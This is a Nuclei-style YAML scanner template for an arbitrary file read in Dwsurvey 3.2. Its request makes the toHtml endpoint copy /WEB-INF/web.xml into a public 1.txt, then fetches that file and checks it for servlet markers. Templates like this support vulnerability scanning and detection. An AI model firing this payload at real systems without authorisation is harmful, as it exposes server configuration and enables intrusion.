id: DIAOWEN-fileRead

info:
  name: Dwsurvey 3.2 Arbitrary File Read
  author: Str1am
  severity: high
  tags: DIAOWEN,fileRead

requests:
  - method: GET
    path:
      - "{{BaseURL}}/diaowen/toHtml?filePath=/&fileName=1.txt&url=/WEB-INF/web.xml"
      - "{{BaseURL}}/diaowen/1.txt"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "filter-name"
          - "servlet-name"
        part: body
        condition: or
